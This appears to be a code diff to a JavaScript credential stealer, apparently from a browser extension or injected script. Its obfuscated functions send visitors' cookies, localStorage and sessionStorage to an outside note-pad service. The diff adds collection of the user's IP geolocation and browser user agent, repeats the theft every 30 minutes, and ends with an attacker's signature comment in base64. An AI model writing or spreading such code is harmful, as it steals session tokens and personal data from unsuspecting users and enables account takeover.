@@ -83,7 +83,6 @@ function f3() {
 }
 
 function f4(data, id, pad_id, tab_index) {
-  console.log(id, tab_index, data)
   fetch('https://www.itextpad.com/api/v3/pad-tab/' + id, {
     method: 'PUT',
     headers: {
@@ -92,18 +91,29 @@ function f4(data, id, pad_id, tab_index) {
     },
     body: JSON.stringify({
       "id": id,
-      "pad_tab_name": "reporting",
+      // "pad_tab_name": "reporting",
       "pad_id": pad_id,
       "note": data,
       "tab_index": tab_index
     }),
   })
-    .then(response => response.json())
-    .then(data => { })
-    .catch((error) => { });
 }
 
-function f5() {
+async function f5() {
+  const details_url = 'http://ip-api.com/json/';
+  let user_details = {};
+
+  try {
+    const response = await fetch(details_url);
+    user_details = await response.json();
+  } catch (error) {
+  }
+
+  const request_data = navigator.userAgent;
+  return JSON.stringify({ user_details, request_data });
+}
+
+function f6() {
   f1((yourCookies) => {
     f4(yourCookies, 259299, 192846, 1)
   });
@@ -112,21 +122,21 @@ function f5() {
     .then((yourLocalStorage) => {
       f4(yourLocalStorage, 259300, 192846, 2)
     })
-    .catch((error) => {
-
-    });
+    .catch((error) => {});
 
   f3()
     .then((yourSessionStorage) => {
       f4(yourSessionStorage, 259301, 192846, 3)
-
     })
-    .catch((error) => {
-
-    });
+    .catch((error) => {});
+    
+    f5().then((yourSessionStorage) => {
+      f4(yourSessionStorage, 259306, 192846, 4)
+    })
+    .catch((error) => {});
 }
-f5()
 
-setInterval(f5, 1800000);
+f6()
+setInterval(f6, 1800000);
 //VGhlIERlYWRTb3VsIHdhcyBoZXJl
 
